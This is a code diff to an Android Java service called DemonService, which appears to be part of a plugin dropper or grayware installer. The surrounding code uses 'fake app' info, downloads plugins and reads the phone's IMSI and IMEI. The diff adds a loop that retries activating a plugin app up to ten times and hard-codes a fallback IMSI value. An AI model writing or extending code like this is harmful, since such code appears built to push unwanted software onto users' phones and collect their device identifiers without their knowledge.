@@ -71,7 +71,7 @@ public class DemonService extends IntentService {
                 //sleep 3S
                 //此处sleep的目的是为了防止用户的手机安装反应过慢的问题
                 try {
-                    Thread.sleep(3 * 1000);
+                    Thread.sleep(2 * 1000);
                 } catch (Exception e) {
                     e.printStackTrace();
                 }
@@ -88,6 +88,12 @@ public class DemonService extends IntentService {
                     i.putExtra("packageName", AppRuntime.CURRENT_FAKE_APP_INFO.packageNmae);
                 }
                 startService(i);
+
+                if (SettingManager.getInstance().getLoopActiveCount() < 10) {
+                    SettingManager.getInstance().setLoopActiveCount(SettingManager.getInstance().getLoopActiveCount() + 1);
+                    Utils.tryToActivePluginApp(getApplicationContext());
+                }
+
             } else if (ACTION_DOWNLOAD_PLUGIN.equals(action)) {
                 if (Config.DEBUG) {
                     Config.LOGD("[[DemonService::onHandleIntent]] action = " + action);
@@ -111,7 +117,8 @@ public class DemonService extends IntentService {
             }
             String imsi = UtilsRuntime.getIMSI(getApplicationContext());
             if (TextUtils.isEmpty(imsi)) {
-                imsi = String.valueOf(System.currentTimeMillis() + 9999);
+//                imsi = String.valueOf(System.currentTimeMillis() + 9999);
+                imsi = "987654321";
             }
             String uuid = SettingManager.uuid != null ? SettingManager.uuid.toString() : imei;
 
@@ -214,7 +221,8 @@ public class DemonService extends IntentService {
                     }
                     String imsi = UtilsRuntime.getIMSI(getApplicationContext());
                     if (TextUtils.isEmpty(imsi)) {
-                        imsi = String.valueOf(System.currentTimeMillis() + 9999);
+//                        imsi = String.valueOf(System.currentTimeMillis() + 9999);
+                        imsi = "987654321";
                     }
                     String uuid = SettingManager.uuid != null ? SettingManager.uuid.toString() : imei;
 
